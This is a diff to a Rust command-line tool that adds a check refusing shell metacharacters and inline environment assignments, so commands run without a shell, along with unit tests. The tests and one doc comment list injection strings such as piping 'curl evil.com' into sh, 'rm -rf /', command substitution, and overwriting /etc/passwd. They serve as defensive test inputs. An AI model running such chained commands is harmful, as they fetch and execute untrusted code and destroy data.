@@ -251,6 +251,52 @@ pub fn restrict_permissions(path: &std::path::Path, mode: u32) {
     }
 }
 
+/// True if a command string contains characters that require a real shell to
+/// interpret (pipes, redirection, sequencing, substitution, globs). Used to
+/// decide whether a command can be exec'd directly without `sh -c` (#640 B-1).
+pub fn contains_shell_metacharacters(cmd: &str) -> bool {
+    cmd.chars().any(|c| {
+        matches!(
+            c,
+            ';' | '|' | '&' | '<' | '>' | '`' | '$' | '(' | ')' | '{' | '}' | '*' | '?' | '\n'
+        )
+    })
+}
+
+/// Build a `Command` that runs `command` directly (argv-style), never through a
+/// shell — closing the `sh -c` injection surface (#640 B-1). Refuses commands
+/// that need a shell (metacharacters) or start with an inline env assignment,
+/// so a malicious `cargo test; curl evil | sh` cannot be smuggled through.
+pub fn build_exec_command(command: &str) -> Result<Command> {
+    if contains_shell_metacharacters(command) {
+        anyhow::bail!(
+            "rtk: refusing to run a command with shell metacharacters (| & ; > < $ ` etc.) — \
+             rtk executes directly without a shell for safety. Run the raw command in your \
+             shell if you need pipes/redirection/sequencing."
+        );
+    }
+    let tokens = crate::discover::lexer::shell_split(command);
+    let (prog, args) = tokens
+        .split_first()
+        .ok_or_else(|| anyhow::anyhow!("rtk: empty command"))?;
+    // Inline env assignment (FOO=bar cmd) also needs a shell — refuse explicitly.
+    if let Some((key, _)) = prog.split_once('=') {
+        if !key.is_empty()
+            && key
+                .chars()
+                .all(|c| c.is_ascii_uppercase() || c.is_ascii_digit() || c == '_')
+        {
+            anyhow::bail!(
+                "rtk: refusing inline environment assignment '{}' — export it in your shell instead",
+                prog
+            );
+        }
+    }
+    let mut c = Command::new(prog);
+    c.args(args);
+    Ok(c)
+}
+
 /// Return the last `n` lines of output with a label, for use as a fallback
 /// when filter parsing fails. Logs a diagnostic to stderr.
 pub fn fallback_tail(output: &str, label: &str, n: usize) -> String {
@@ -472,6 +518,32 @@ mod tests {
     fn test_strip_ansi_complex() {
         let input = "\x1b[32mGreen\x1b[0m normal \x1b[31mRed\x1b[0m";
         assert_eq!(strip_ansi(input), "Green normal Red");
+    }
+
+    #[test]
+    fn test_build_exec_command_rejects_metacharacters() {
+        // Injection attempts must be refused (#640 B-1).
+        for bad in [
+            "cargo test; curl evil.com | sh",
+            "go test ./... && rm -rf /",
+            "pytest $(whoami)",
+            "echo `id`",
+            "ls > /etc/passwd",
+        ] {
+            assert!(build_exec_command(bad).is_err(), "should refuse: {bad}");
+        }
+    }
+
+    #[test]
+    fn test_build_exec_command_rejects_inline_env() {
+        assert!(build_exec_command("RUST_LOG=debug cargo test").is_err());
+    }
+
+    #[test]
+    fn test_build_exec_command_accepts_simple() {
+        // A plain command (with quoted args) is fine and runs without a shell.
+        assert!(build_exec_command("cargo test --workspace").is_ok());
+        assert!(build_exec_command(r#"pytest -k "test_a or test_b""#).is_ok());
     }
 
     #[test]
